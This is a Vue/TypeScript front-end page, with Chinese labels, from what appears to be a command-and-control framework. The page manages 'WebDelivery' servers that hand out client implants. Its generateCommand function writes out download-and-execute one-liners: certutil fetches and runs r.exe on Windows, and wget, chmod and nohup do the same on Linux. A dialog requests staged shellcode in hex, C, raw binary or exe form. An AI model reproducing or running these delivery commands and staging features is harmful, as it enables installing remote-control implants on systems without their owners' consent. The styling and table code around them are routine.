<template>
  <div class="webdelivery-management">
    <!-- 头部区域 -->
    <div class="header-section">
      <div class="header-content">
        <h1 class="page-title">WebDelivery 管理</h1>
        <p class="page-subtitle">通过Web方式投递客户端程序</p>
      </div>
      <el-button
          type="primary"
          size="large"
          class="add-btn"
          @click="dialogVisible = true"
      >
        <el-icon><Plus /></el-icon>
        新增 WebDelivery
      </el-button>
    </div>

    <!-- 统计卡片 -->
    <div class="stats-cards">
      <el-card class="stat-card">
        <div class="stat-content">
          <el-icon class="stat-icon total-icon"><DataLine /></el-icon>
          <div class="stat-info">
            <div class="stat-value">{{ tableData.length }}</div>
            <div class="stat-label">总数</div>
          </div>
        </div>
      </el-card>

      <el-card class="stat-card">
        <div class="stat-content">
          <el-icon class="stat-icon active-icon"><CircleCheck /></el-icon>
          <div class="stat-info">
            <div class="stat-value">{{ activeDeliveries }}</div>
            <div class="stat-label">活跃</div>
          </div>
        </div>
      </el-card>

      <el-card class="stat-card">
        <div class="stat-content">
          <el-icon class="stat-icon inactive-icon"><CircleClose /></el-icon>
          <div class="stat-info">
            <div class="stat-value">{{ inactiveDeliveries }}</div>
            <div class="stat-label">未启动</div>
          </div>
        </div>
      </el-card>
    </div>

    <!-- 主表格 -->
    <el-card class="main-table-card" shadow="hover">
      <template #header>
        <div class="table-header">
          <h3 class="table-title">WebDelivery 列表</h3>
          <div class="table-actions">
            <el-tooltip content="刷新列表" placement="top">
              <el-button
                  type="info"
                  size="small"
                  @click="getWebDeliveryList"
                  :loading="loading"
              >
                <el-icon><Refresh /></el-icon>
              </el-button>
            </el-tooltip>
          </div>
        </div>
      </template>

      <el-table
          :data="tableData"
          class="custom-table"
          v-loading="loading"
          empty-text="暂无WebDelivery数据"
      >
        <el-table-column prop="ListenerConfig" label="监听器" min-width="180">
          <template #default="{ row }">
            <div class="listener-cell">
              <el-icon class="listener-icon"><Connection /></el-icon>
              <div class="listener-content">
                <div class="listener-text">{{ row.ListenerConfig }}</div>
                <div class="listener-label">监听器配置</div>
              </div>
            </div>
          </template>
        </el-table-column>

        <el-table-column prop="OS" label="操作系统" width="140">
          <template #default="{ row }">
            <el-tag
                :type="row.OS === 'windows' ? 'primary' : row.OS === 'linux' ? 'success' : 'info'"
                class="os-tag"
                effect="light"
                round
            >
              {{ row.OS }}
            </el-tag>
          </template>
        </el-table-column>

        <el-table-column prop="Arch" label="架构" width="120">
          <template #default="{ row }">
            <div class="arch-cell">
              <el-icon class="arch-icon"><Cpu /></el-icon>
              <span class="arch-text">{{ row.Arch.toUpperCase() }}</span>
            </div>
          </template>
        </el-table-column>

        <el-table-column prop="Pass" label="上线密码" width="150">
          <template #default="{ row }">
            <div class="password-cell">
              <el-icon class="password-icon"><Lock /></el-icon>
              <span class="password-text">{{ row.Pass || '未设置' }}</span>
            </div>
          </template>
        </el-table-column>

        <el-table-column prop="ListeningPort" label="监听端口" width="120">
          <template #default="{ row }">
            <div class="port-cell">
              <el-tag type="info" effect="plain" class="port-tag">
                {{ row.ListeningPort }}
              </el-tag>
            </div>
          </template>
        </el-table-column>

        <el-table-column label="状态" width="120">
          <template #default="{ row }">
            <div class="status-cell">
              <div
                  class="status-dot"
                  :class="{ 'status-active': row.Status === 1, 'status-inactive': row.Status === 2 }"
              ></div>
              <el-tag
                  :type="row.Status === 1 ? 'success' : 'danger'"
                  size="small"
                  class="status-tag"
                  effect="light"
              >
                {{ row.Status === 1 ? '运行中' : '已停止' }}
              </el-tag>
            </div>
          </template>
        </el-table-column>

        <el-table-column label="操作" width="280">
          <template #default="{ row }">
            <div class="action-buttons">
              <!-- 上线命令按钮 -->
              <el-popover
                  placement="top-start"
                  :width="row.OS === 'windows' ? 480 : 520"
                  trigger="click"
                  class="command-popover"
              >
                <template #reference>
                  <el-button
                      size="small"
                      type="success"
                      :disabled="row.Status !== 1"
                      class="action-btn"
                  >
                    <el-tooltip content="查看上线命令" placement="top">
                      <el-icon><Promotion /></el-icon>
                    </el-tooltip>
                  </el-button>
                </template>
                <div class="command-content">
                  <h4 class="command-title">上线命令</h4>
                  <pre class="command-code">{{ generateCommand(row) }}</pre>
                  <div class="command-actions">
                    <el-button
                        size="small"
                        type="primary"
                        @click="copyToClipboard(generateCommand(row))"
                    >
                      <el-icon><CopyDocument /></el-icon>
                      复制命令
                    </el-button>
                  </div>
                </div>
              </el-popover>

              <!-- Shellcode生成 -->
              <el-tooltip
                  v-if="row.OS === 'windows' && row.Status === 1"
                  content="生成Shellcode"
                  placement="top"
              >
                <el-button
                    size="small"
                    type="warning"
                    class="action-btn"
                    @click="openShellcodeDialog(row)"
                >
                  <el-icon><MagicStick /></el-icon>
                </el-button>
              </el-tooltip>

              <!-- 开启/关闭 -->
              <el-tooltip
                  :content="row.Status === 1 ? '停止服务' : '启动服务'"
                  placement="top"
              >
                <el-button
                    size="small"
                    :type="row.Status === 1 ? 'primary' : 'success'"
                    class="action-btn"
                    @click="row.Status === 1 ? handleClose(row) : handleOpen(row)"
                >
                  <el-icon>
                    <component :is="row.Status === 1 ? VideoPause : VideoPlay" />
                  </el-icon>
                </el-button>
              </el-tooltip>

              <!-- 删除 -->
              <el-tooltip content="删除" placement="top">
                <el-button
                    size="small"
                    type="danger"
                    class="action-btn"
                    @click="handleDelete(row)"
                >
                  <el-icon><Delete /></el-icon>
                </el-button>
              </el-tooltip>
            </div>
          </template>
        </el-table-column>
      </el-table>
    </el-card>

    <!-- 新增对话框 -->
    <el-dialog
        v-model="dialogVisible"
        title="配置 WebDelivery"
        width="580px"
        class="add-dialog"
        :close-on-click-modal="false"
    >
      <div class="dialog-content">
        <el-form :model="formData" label-position="top" class="config-form">
          <!-- Listener 选择 -->
          <el-form-item label="监听器" required>
            <el-select
                v-model="formData.listener"
                placeholder="选择监听器"
                class="form-select"
                @visible-change="handleDropdown"
                :loading="loadingListeners"
                clearable
                filterable
                size="large"
            >
              <template #prefix>
                <el-icon><Connection /></el-icon>
              </template>
              <el-option
                  v-for="item in listenerOptions"
                  :key="item"
                  :label="item"
                  :value="item"
              >
                <div class="listener-option">
                  <el-icon class="option-icon"><Connection /></el-icon>
                  <span class="option-label">{{ item }}</span>
                </div>
              </el-option>
              <template #empty>
                <div class="empty-option">暂无可用监听器</div>
              </template>
            </el-select>
            <div class="form-hint">客户端连接的监听器地址</div>
          </el-form-item>

          <!-- 操作系统和架构 -->
          <div class="row-group">
            <el-form-item label="操作系统" required class="half-width">
              <div class="os-selector">
                <div
                    v-for="os in osOptions"
                    :key="os.value"
                    class="os-option"
                    :class="{ 'os-selected': formData.os === os.value }"
                    @click="selectOS(os.value)"
                >
                  <div class="os-icon-wrapper">
                    <el-icon :class="['os-icon', `os-${os.value}`]">
                      <component :is="os.icon" />
                    </el-icon>
                  </div>
                  <div class="os-name">{{ os.label }}</div>
                </div>
              </div>
            </el-form-item>

            <el-form-item label="系统架构" required class="half-width">
              <el-select
                  v-model="formData.arch"
                  placeholder="选择架构"
                  :disabled="!formData.os"
                  size="large"
                  class="arch-select"
              >
                <template #prefix>
                  <el-icon><Cpu /></el-icon>
                </template>
                <el-option
                    v-for="arch in archOptions"
                    :key="arch"
                    :label="arch.toUpperCase()"
                    :value="arch"
                >
                  <div class="arch-option-item">
                    <el-icon><Cpu /></el-icon>
                    <span class="arch-label">{{ arch.toUpperCase() }}</span>
                    <span class="arch-desc">{{ getArchDescription(arch) }}</span>
                  </div>
                </el-option>
              </el-select>
            </el-form-item>
          </div>

          <!-- 端口和文件名 -->
          <div class="row-group">
            <el-form-item label="监听端口" required class="half-width">
              <el-input
                  v-model="formData.port"
                  placeholder="如: 8080"
                  size="large"
                  clearable
              >
                <template #prefix>
                  <el-icon><Monitor /></el-icon>
                </template>
              </el-input>
              <div class="form-hint">Web服务的监听端口</div>
            </el-form-item>

            <el-form-item label="文件名称" class="half-width">
              <el-input
                  v-model="formData.filename"
                  placeholder="如: download.exe"
                  size="large"
                  clearable
              >
                <template #prefix>
                  <el-icon><Document /></el-icon>
                </template>
              </el-input>
              <div class="form-hint">客户端文件下载名称</div>
            </el-form-item>
          </div>

          <!-- 上线密码 -->
          <el-form-item label="连接密码">
            <div class="password-input-wrapper">
              <el-input
                  v-model="formData.pass"
                  placeholder="可选，客户端连接密码"
                  type="password"
                  show-password
                  clearable
                  size="large"
                  class="password-input"
                  :maxlength="32"
              >
                <template #prefix>
                  <el-icon><Lock /></el-icon>
                </template>
              </el-input>
              <el-tooltip content="生成随机密码" placement="top">
                <el-button
                    class="generate-password-btn"
                    @click="generateRandomPassword"
                    :icon="Refresh"
                    circle
                    size="small"
                />
              </el-tooltip>
            </div>
            <div class="form-hint">客户端连接验证密码（可选）</div>
          </el-form-item>
        </el-form>
      </div>

      <template #footer>
        <div class="dialog-footer">
          <el-button @click="dialogVisible = false" :disabled="submitting">
            取消
          </el-button>
          <el-button
              type="primary"
              @click="handleWebDelivery"
              :loading="submitting"
              :disabled="!isFormValid"
          >
            <template #default>
              <span v-if="!submitting">创建 WebDelivery</span>
              <span v-else>创建中...</span>
            </template>
          </el-button>
        </div>
      </template>
    </el-dialog>

    <!-- Shellcode生成对话框 -->
    <el-dialog
        v-model="dialogVisible2"
        title="生成 Stage Shellcode"
        width="480px"
        class="shellcode-dialog"
        :close-on-click-modal="false"
    >
      <div class="dialog-content">
        <div class="shellcode-info">
          <div class="info-item">
            <span class="info-label">监听器：</span>
            <span class="info-value">{{ selectedListener }}</span>
          </div>
          <div class="info-item">
            <span class="info-label">端口：</span>
            <span class="info-value">{{ selectedPort }}</span>
          </div>
        </div>

        <el-form :model="selectedFormat" label-position="top" class="format-form">
          <el-form-item label="输出格式" required>
            <div class="format-grid">
              <div
                  v-for="format in formatOptions"
                  :key="format.value"
                  class="format-option"
                  :class="{ 'format-selected': selectedFormat.format === format.value }"
                  @click="selectedFormat.format = format.value"
              >
                <div class="format-icon">
                  <el-icon class="format-icon-svg">
                    <component :is="format.icon" />
                  </el-icon>
                </div>
                <div class="format-info">
                  <div class="format-name">{{ format.label }}</div>
                  <div class="format-desc">{{ format.description }}</div>
                </div>
                <el-icon
                    v-if="selectedFormat.format === format.value"
                    class="format-check"
                >
                  <Check />
                </el-icon>
              </div>
            </div>
          </el-form-item>
        </el-form>
      </div>

      <template #footer>
        <div class="dialog-footer">
          <el-button @click="dialogVisible2 = false">
            取消
          </el-button>
          <el-button
              type="primary"
              @click="handleStageShellcode"
              :loading="generatingShellcode"
              :disabled="!selectedFormat.format"
          >
            生成并下载
          </el-button>
        </div>
      </template>
    </el-dialog>
  </div>
</template>

<script setup lang="ts">
import { ref, reactive, computed, onMounted } from "vue"
import { ElMessage, ElMessageBox } from "element-plus"
import {
  Plus,
  Refresh,
  Connection,
  Cpu,
  Lock,
  Monitor,
  Document,
  CopyDocument,
  Promotion,
  MagicStick,
  VideoPlay,
  VideoPause,
  Delete,
  DataLine,
  CircleCheck,
  CircleClose,
  Check,
  Warning,
  SuccessFilled,
  Download
} from '@element-plus/icons-vue'
import ClientAPI from "@/api/clients"

// 状态
const tableData = ref([])
const loading = ref(false)
const dialogVisible = ref(false)
const dialogVisible2 = ref(false)
const loadingListeners = ref(false)
const submitting = ref(false)
const generatingShellcode = ref(false)

// 监听器选项
const listenerOptions = ref([])

// 操作系统选项
const osOptions = [
  { label: 'Windows', value: 'windows', icon: Monitor },
  { label: 'Linux', value: 'linux', icon: Monitor },
  { label: 'macOS', value: 'darwin', icon: Monitor }
]

// 架构映射
const archMapping: Record<string, string[]> = {
  windows: ['amd64', '386'],
  linux: ['amd64', '386', 'arm', 'arm64', 'loong64', 'mips', 'mipsle', 'mips64', 'mips64le'],
  darwin: ['amd64', 'arm64']
}

// 架构描述
const archDescriptions: Record<string, string> = {
  'amd64': '64位 x86 架构',
  '386': '32位 x86 架构',
  'arm': 'ARM 架构 (32位)',
  'arm64': 'ARM 64位架构',
  'loong64': '龙芯架构',
  'mips': 'MIPS 架构 (大端)',
  'mipsle': 'MIPS 架构 (小端)',
  'mips64': 'MIPS 64位 (大端)',
  'mips64le': 'MIPS 64位 (小端)'
}

// 格式选项
const formatOptions = [
  { value: 'hex', label: '十六进制', icon: Warning, description: 'HEX格式Shellcode' },
  { value: 'c', label: 'C 数组', icon: Document, description: 'C语言数组格式' },
  { value: 'bin', label: '二进制', icon: SuccessFilled, description: '原始二进制文件' },
  { value: 'exe', label: '可执行程序', icon: Download, description: 'Windows可执行文件' }
]

// 表单数据
const formData = reactive({
  port: '',
  listener: '',
  os: '',
  arch: '',
  filename: '',
  pass: ''
})

// 架构选项
const archOptions = ref<string[]>([])

// 选中的行数据
const selectedListener = ref('')
const selectedPort = ref('')
const selectedFormat = reactive({
  format: ''
})

// 计算属性
const activeDeliveries = computed(() => {
  return (tableData.value as any[]).filter(item => item.Status === 1).length
})

const inactiveDeliveries = computed(() => {
  return (tableData.value as any[]).filter(item => item.Status === 2).length
})

const isFormValid = computed(() => {
  return formData.listener && formData.os && formData.arch && formData.port
})

// 方法
const getArchDescription = (arch: string) => {
  return archDescriptions[arch] || '未知架构'
}

const generateCommand = (row: any) => {
  if (row.OS === 'windows') {
    return `certutil -urlcache -split -f ${row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe ${row.Pass || ''}`
  } else {
    return `wget -P /tmp ${row.ServerAddress}; chmod +x /tmp/${row.FileName}; nohup /tmp/${row.FileName} ${row.Pass || ''} > m.log 2>&1 &`
  }
}

const handleDropdown = async (visible: boolean) => {
  if (visible && listenerOptions.value.length === 0) {
    loadingListeners.value = true
    try {
      const res = await ClientAPI.ShowListener()
      if (res.status === 200 && res.data.status === 200) {
        listenerOptions.value = res.data.data
      } else {
        ElMessage.error(res.data?.data || '获取监听器列表失败')
      }
    } catch (error) {
      console.error('获取监听器失败:', error)
      ElMessage.error('获取监听器列表失败')
    } finally {
      loadingListeners.value = false
    }
  }
}

const selectOS = (os: string) => {
  formData.os = os
  formData.arch = ''
  archOptions.value = archMapping[os] || []
}

const generateRandomPassword = () => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*'
  let password = ''
  for (let i = 0; i < 16; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length))
  }
  formData.pass = password
  ElMessage.success('已生成随机密码')
}

const getWebDeliveryList = async () => {
  loading.value = true
  try {
    const res = await ClientAPI.GetWebDeliveryList()
    if (res.status === 200 && res.data.status === 200) {
      tableData.value = res.data.data
    } else {
      ElMessage.error(res.data?.data || '获取列表失败')
    }
  } catch (error) {
    console.error('获取WebDelivery列表失败:', error)
    ElMessage.error('获取列表失败')
  } finally {
    loading.value = false
  }
}

const handleWebDelivery = async () => {
  if (!isFormValid.value) {
    ElMessage.warning('请填写完整的配置信息')
    return
  }

  submitting.value = true
  try {
    const res = await ClientAPI.StartWebDelivery({
      listener: formData.listener,
      os: formData.os,
      arch: formData.arch,
      port: formData.port,
      filename: formData.filename,
      pass: formData.pass
    })

    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success('WebDelivery 创建成功')
      dialogVisible.value = false
      resetForm()
      await getWebDeliveryList()
    } else {
      ElMessage.error(res.data?.data || '创建失败')
    }
  } catch (error) {
    console.error('创建WebDelivery失败:', error)
    ElMessage.error('创建失败')
  } finally {
    submitting.value = false
  }
}

const handleClose = async (row: any) => {
  try {
    const res = await ClientAPI.CloseWebDelivery({ port: row.ListeningPort })
    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success('已停止服务')
      await getWebDeliveryList()
    } else {
      ElMessage.error(res.data?.data || '停止失败')
    }
  } catch (error) {
    console.error('停止WebDelivery失败:', error)
    ElMessage.error('停止失败')
  }
}

const handleOpen = async (row: any) => {
  try {
    const res = await ClientAPI.OpenWebDelivery({ port: row.ListeningPort })
    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success('服务已启动')
      await getWebDeliveryList()
    } else {
      ElMessage.error(res.data?.data || '启动失败')
    }
  } catch (error) {
    console.error('启动WebDelivery失败:', error)
    ElMessage.error('启动失败')
  }
}

const handleDelete = async (row: any) => {
  try {
    await ElMessageBox.confirm(
        `确定要删除端口 ${row.ListeningPort} 的WebDelivery服务吗？`,
        '删除确认',
        {
          confirmButtonText: '确定',
          cancelButtonText: '取消',
          type: 'warning'
        }
    )

    const res = await ClientAPI.DeleteWebDelivery({ port: row.ListeningPort })
    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success('删除成功')
      await getWebDeliveryList()
    } else {
      ElMessage.error(res.data?.data || '删除失败')
    }
  } catch (error) {
    if (error !== 'cancel') {
      console.error('删除WebDelivery失败:', error)
      ElMessage.error('删除失败')
    }
  }
}

const openShellcodeDialog = (row: any) => {
  selectedListener.value = row.ListenerConfig
  selectedPort.value = row.ListeningPort
  selectedFormat.format = ''
  dialogVisible2.value = true
}

const handleStageShellcode = async () => {
  if (!selectedFormat.format) {
    ElMessage.warning('请选择输出格式')
    return
  }

  generatingShellcode.value = true
  try {
    const res = await ClientAPI.StageShellCodeGen({
      listener: selectedListener.value,
      port: selectedPort.value,
      format: selectedFormat.format
    })

    if (res.status === 200) {
      // 处理文件下载
      const contentDisposition = res.headers['content-disposition'] || ''
      const matches = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(contentDisposition)
      let fileName = matches && matches.length > 1
          ? decodeURIComponent(matches[1].replace(/['"]/g, ''))
          : `shellcode_${selectedListener.value}_${selectedPort.value}.${selectedFormat.format}`

      const blob = new Blob([res.data], { type: res.headers['content-type'] })
      const downloadElement = document.createElement('a')
      const href = window.URL.createObjectURL(blob)

      downloadElement.href = href
      downloadElement.download = fileName
      document.body.appendChild(downloadElement)
      downloadElement.click()
      document.body.removeChild(downloadElement)
      window.URL.revokeObjectURL(href)

      ElMessage.success('Shellcode生成成功，开始下载')
      dialogVisible2.value = false
    } else {
      ElMessage.error('生成失败')
    }
  } catch (error) {
    console.error('生成Shellcode失败:', error)
    ElMessage.error('生成失败')
  } finally {
    generatingShellcode.value = false
  }
}

const copyToClipboard = (text: string) => {
  navigator.clipboard.writeText(text).then(() => {
    ElMessage.success('命令已复制到剪贴板')
  }).catch(() => {
    ElMessage.error('复制失败，请手动复制')
  })
}

const resetForm = () => {
  formData.port = ''
  formData.listener = ''
  formData.os = ''
  formData.arch = ''
  formData.filename = ''
  formData.pass = ''
  archOptions.value = []
}

onMounted(async () => {
  await getWebDeliveryList()
})
</script>

<style scoped>
.webdelivery-management {
  padding: 24px;
  background: linear-gradient(135deg, #f5f7fa 0%, #e4e7ed 100%);
  min-height: calc(100vh - 60px);
}

.header-section {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 32px;
  flex-wrap: wrap;
  gap: 20px;
}

.header-content {
  flex: 1;
}

.page-title {
  margin: 0;
  font-size: 32px;
  font-weight: 700;
  color: #2c3e50;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  letter-spacing: 1px;
}

.page-subtitle {
  margin: 8px 0 0 0;
  font-size: 15px;
  color: #7f8c8d;
}

.add-btn {
  height: 44px;
  padding: 0 24px;
  border-radius: 10px;
  font-weight: 600;
  box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
  transition: all 0.3s;
}

.add-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
}

.add-btn .el-icon {
  margin-right: 8px;
  font-size: 18px;
}

/* 统计卡片 */
.stats-cards {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 16px;
  margin-bottom: 24px;
}

.stat-card {
  border-radius: 12px;
  border: 1px solid #ebeef5;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
  transition: all 0.3s;
  cursor: pointer;
}

.stat-card:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
}

.stat-content {
  display: flex;
  align-items: center;
  gap: 16px;
  padding: 8px 0;
}

.stat-icon {
  width: 48px;
  height: 48px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 24px;
}

.total-icon {
  background: rgba(64, 158, 255, 0.1);
  color: #409eff;
}

.active-icon {
  background: rgba(103, 194, 58, 0.1);
  color: #67c23a;
}

.inactive-icon {
  background: rgba(245, 108, 108, 0.1);
  color: #f56c6c;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: 700;
  color: #2c3e50;
  line-height: 1;
}

.stat-label {
  font-size: 13px;
  color: #7f8c8d;
  margin-top: 4px;
}

/* 主表格 */
.main-table-card {
  border-radius: 16px;
  border: 1px solid #ebeef5;
  margin-bottom: 24px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08) !important;
}

.main-table-card :deep(.el-card__header) {
  border-bottom: 1px solid #ebeef5;
  padding: 20px 24px;
  background: linear-gradient(90deg, #f8f9fa 0%, #fff 100%);
}

.table-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.table-title {
  margin: 0;
  font-size: 18px;
  font-weight: 600;
  color: #303133;
  display: flex;
  align-items: center;
  gap: 8px;
}

.table-title:before {
  content: '';
  display: block;
  width: 4px;
  height: 18px;
  background: linear-gradient(180deg, #409eff 0%, #79bbff 100%);
  border-radius: 2px;
}

.custom-table {
  font-size: 13px;
}

.custom-table :deep(.el-table__header-wrapper th) {
  background: #f8f9fa;
  font-weight: 600;
  color: #495057;
  border-bottom: 2px solid #e9ecef;
}

.custom-table :deep(.el-table__row:hover) {
  background-color: #f8fafc;
}

.custom-table :deep(.el-table__row:hover td) {
  background-color: #f8fafc !important;
}

/* 表格单元格样式 */
.listener-cell {
  display: flex;
  align-items: center;
  gap: 10px;
}

.listener-icon {
  color: #409eff;
  font-size: 16px;
  flex-shrink: 0;
}

.listener-content {
  flex: 1;
  min-width: 0;
}

.listener-text {
  font-family: 'Monaco', 'Consolas', monospace;
  font-size: 13px;
  color: #2c3e50;
  word-break: break-all;
}

.listener-label {
  font-size: 11px;
  color: #7f8c8d;
  margin-top: 2px;
}

.os-tag {
  font-weight: 600;
  font-size: 12px;
  padding: 4px 12px;
  letter-spacing: 0.5px;
}

.arch-cell {
  display: flex;
  align-items: center;
  gap: 8px;
}

.arch-icon {
  color: #909399;
  font-size: 14px;
}

.arch-text {
  font-family: 'Monaco', 'Consolas', monospace;
  font-weight: 500;
}

.password-cell {
  display: flex;
  align-items: center;
  gap: 8px;
}

.password-icon {
  color: #e6a23c;
  font-size: 14px;
}

.password-text {
  font-family: 'Monaco', 'Consolas', monospace;
  font-size: 12px;
  color: #e6a23c;
  font-weight: 500;
}

.port-cell {
  display: flex;
  align-items: center;
}

.port-tag {
  font-family: 'Monaco', 'Consolas', monospace;
  font-weight: 600;
}

.status-cell {
  display: flex;
  align-items: center;
  gap: 8px;
  justify-content: center;
}

.status-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
}

.status-active {
  background: #67c23a;
  box-shadow: 0 0 0 2px rgba(103, 194, 58, 0.2);
  animation: pulse 2s infinite;
}

.status-inactive {
  background: #f56c6c;
  box-shadow: 0 0 0 2px rgba(245, 108, 108, 0.2);
}

@keyframes pulse {
  0%, 100% {
    box-shadow: 0 0 0 2px rgba(103, 194, 58, 0.2);
  }
  50% {
    box-shadow: 0 0 0 4px rgba(103, 194, 58, 0.1);
  }
}

/* 操作按钮 */
.action-buttons {
  display: flex;
  gap: 6px;
}

.action-btn {
  width: 32px;
  height: 32px;
  padding: 0;
  transition: all 0.3s;
}

.action-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
}

.action-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* 命令弹窗 */
.command-popover {
  border-radius: 8px;
}

.command-content {
  padding: 4px;
}

.command-title {
  margin: 0 0 12px 0;
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
}

.command-code {
  background: #2d2d2d;
  color: #f8f8f2;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Monaco', 'Consolas', monospace;
  font-size: 13px;
  line-height: 1.5;
  overflow-x: auto;
  margin-bottom: 12px;
  white-space: pre-wrap;
  word-break: break-all;
}

.command-actions {
  display: flex;
  justify-content: flex-end;
}

/* 对话框样式 */
.add-dialog,
.shellcode-dialog {
  border-radius: 16px;
  overflow: hidden;
}

.add-dialog :deep(.el-dialog__header),
.shellcode-dialog :deep(.el-dialog__header) {
  margin: 0;
  padding: 0;
}

.dialog-content {
  padding: 0 8px;
}

.config-form :deep(.el-form-item) {
  margin-bottom: 24px;
}

.config-form :deep(.el-form-item__label) {
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
  padding-bottom: 8px;
  display: block;
}

/* 行组样式 */
.row-group {
  display: flex;
  gap: 24px;
  align-items: flex-start;
}

.half-width {
  flex: 1;
  min-width: 0;
}

/* 操作系统选择器 */
.os-selector {
  display: flex;
  gap: 12px;
}

.os-option {
  flex: 1;
  padding: 16px 12px;
  border: 2px solid #e9ecef;
  border-radius: 10px;
  cursor: pointer;
  transition: all 0.3s;
  background: #f8f9fa;
  text-align: center;
}

.os-option:hover {
  border-color: #409eff;
  background: rgba(64, 158, 255, 0.05);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
}

.os-selected {
  border-color: #409eff !important;
  background: rgba(64, 158, 255, 0.1) !important;
  box-shadow: 0 4px 12px rgba(64, 158, 255, 0.2);
}

.os-icon-wrapper {
  width: 36px;
  height: 36px;
  margin: 0 auto 8px;
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.os-icon {
  font-size: 20px;
}

.os-windows {
  color: #00a4ef;
}

.os-linux {
  color: #333;
}

.os-darwin {
  color: #999;
}

.os-name {
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
}

/* 架构选择器 */
.arch-select :deep(.el-input__wrapper) {
  border-radius: 10px;
  padding-left: 12px;
  height: 48px;
}

.arch-option-item {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px 0;
}

.arch-option-item .el-icon {
  color: #409eff;
  font-size: 16px;
}

.arch-label {
  font-size: 14px;
  font-weight: 500;
  min-width: 60px;
}

.arch-desc {
  font-size: 11px;
  color: #909399;
  flex: 1;
  text-align: right;
}

/* 密码输入框 */
.password-input-wrapper {
  display: flex;
  gap: 12px;
  align-items: center;
}

.password-input {
  flex: 1;
}

.password-input :deep(.el-input__wrapper) {
  border-radius: 10px;
  height: 48px;
}

.generate-password-btn {
  flex-shrink: 0;
}

/* 表单提示 */
.form-hint {
  font-size: 12px;
  color: #6c757d;
  margin-top: 6px;
  padding-left: 4px;
}

/* 对话框底部 */
.add-dialog :deep(.el-dialog__footer),
.shellcode-dialog :deep(.el-dialog__footer) {
  padding: 20px 24px;
  border-top: 1px solid #ebeef5;
}

.dialog-footer {
  display: flex;
  justify-content: flex-end;
  gap: 12px;
}

.dialog-footer .el-button {
  min-width: 100px;
  border-radius: 8px;
  padding: 10px 24px;
  font-weight: 500;
}

/* Shellcode对话框样式 */
.shellcode-info {
  padding: 16px;
  background: #f8f9fa;
  border-radius: 10px;
  margin-bottom: 24px;
  border: 1px solid #e9ecef;
}

.info-item {
  display: flex;
  align-items: center;
  margin-bottom: 8px;
}

.info-item:last-child {
  margin-bottom: 0;
}

.info-label {
  font-size: 13px;
  font-weight: 600;
  color: #495057;
  min-width: 60px;
}

.info-value {
  font-size: 14px;
  color: #2c3e50;
  font-weight: 500;
  font-family: 'Monaco', 'Consolas', monospace;
}

/* 格式选择器 */
.format-form {
  margin-top: 16px;
}

.format-grid {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 12px;
}

.format-option {
  padding: 16px;
  border: 2px solid #e9ecef;
  border-radius: 10px;
  cursor: pointer;
  transition: all 0.3s;
  background: #f8f9fa;
  position: relative;
}

.format-option:hover {
  border-color: #409eff;
  background: rgba(64, 158, 255, 0.05);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
}

.format-selected {
  border-color: #67c23a !important;
  background: rgba(103, 194, 58, 0.1) !important;
  box-shadow: 0 4px 12px rgba(103, 194, 58, 0.2);
}

.format-icon {
  width: 40px;
  height: 40px;
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: rgba(64, 158, 255, 0.1);
  margin-bottom: 8px;
}

.format-icon-svg {
  color: #409eff;
  font-size: 20px;
}

.format-info {
  flex: 1;
}

.format-name {
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 4px;
}

.format-desc {
  font-size: 11px;
  color: #6c757d;
  line-height: 1.3;
}

.format-check {
  position: absolute;
  top: 12px;
  right: 12px;
  color: #67c23a;
  font-size: 18px;
}

/* 响应式设计 */
@media (max-width: 992px) {
  .stats-cards {
    grid-template-columns: repeat(2, 1fr);
  }

  .row-group {
    flex-direction: column;
    gap: 16px;
  }

  .format-grid {
    grid-template-columns: 1fr;
  }
}

@media (max-width: 768px) {
  .webdelivery-management {
    padding: 16px;
  }

  .header-section {
    flex-direction: column;
    align-items: stretch;
  }

  .add-btn {
    width: 100%;
  }

  .stats-cards {
    grid-template-columns: 1fr;
  }

  .os-selector {
    flex-direction: column;
  }

  .action-buttons {
    flex-direction: column;
    gap: 4px;
  }

  .action-btn {
    width: 28px;
    height: 28px;
  }
}

@media (max-width: 480px) {
  .add-dialog,
  .shellcode-dialog {
    width: 90vw !important;
  }

  .dialog-content {
    padding: 0 4px;
  }

  .dialog-footer {
    flex-wrap: wrap;
    justify-content: center;
  }
}
</style>